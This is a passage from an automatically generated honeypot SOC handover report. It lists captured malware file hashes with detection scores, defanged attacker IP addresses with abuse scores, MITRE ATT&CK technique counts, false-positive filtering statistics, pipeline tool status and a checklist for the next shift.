| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `3.15.169[.]123` | US | Amazon Technologies Inc. | **100** ⚠️ | 7 |
| `106.13.144[.]200` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 6 |
| `120.48.76[.]190` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `180.76.194[.]91` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 10 |
| `116.55.245[.]26` | CN | CHINANET YUNNAN PROVINCE NETWORK | **100** ⚠️ | 50 |
| `129.222.203[.]169` | CO | SpaceX Services, Inc. | **100** ⚠️ | 0 |
| `37.25.99[.]250` | UA | WildPark Co | **100** ⚠️ | 3 |
| `58.42.8[.]7` | CN | China Telecom | **100** ⚠️ | 43 |
| `14.103.108[.]225` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `140.246.137[.]102` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 209 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 121 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 77 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 38 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 38 |

---

## 🔕 False Positive Summary (831 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 821 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 1034 cases |
| Tool 34  | Credential Extractor        | ✅ 198 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 63 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 831 filtered (80.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 34 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 74 priority case(s) shown individually · 23 recon entry/entries in table (11 group(s) consolidating 117 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-01T22:54:38Z_
